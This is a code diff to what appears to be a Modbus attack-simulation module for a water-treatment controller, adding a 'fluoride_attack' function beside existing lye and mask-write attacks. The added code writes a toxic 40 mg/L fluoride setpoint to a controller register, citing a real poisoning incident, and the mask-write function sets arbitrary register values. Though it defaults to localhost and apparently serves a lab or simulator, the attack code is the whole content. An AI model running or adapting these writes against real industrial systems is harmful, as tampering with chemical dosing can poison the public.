@@ -54,6 +54,18 @@ async def lye_attack(port: int, value: int = 11100, host: str = "127.0.0.1") -> 
         await c.close()
 
 
+async def fluoride_attack(port: int, value: float = 40.0, host: str = "127.0.0.1") -> str:
+    """Fluoride overfeed: 40 mg/L, what a Mississippi town's restaurant water reached in 1993 when a faulty feed
+    pump siphoned fluoride solution into the reservoir (Penman et al., Public Health Reports, 1997)."""
+    t = TAGS.holding["fluoride_dose"]
+    c = await _client(port, 68, host).connect()
+    try:
+        r = await _try(c.write(t.address, t.to_raw(value)))
+        return f"FC 6 write fluoride={value:g} mg/L: {r}"
+    finally:
+        await c.close()
+
+
 async def mask_attack(port: int, value: int = 9000, host: str = "127.0.0.1") -> str:
     """FC 22 with and_mask=0 sets the register to or_mask, i.e. an arbitrary value."""
     c = await _client(port, 67, host).connect()
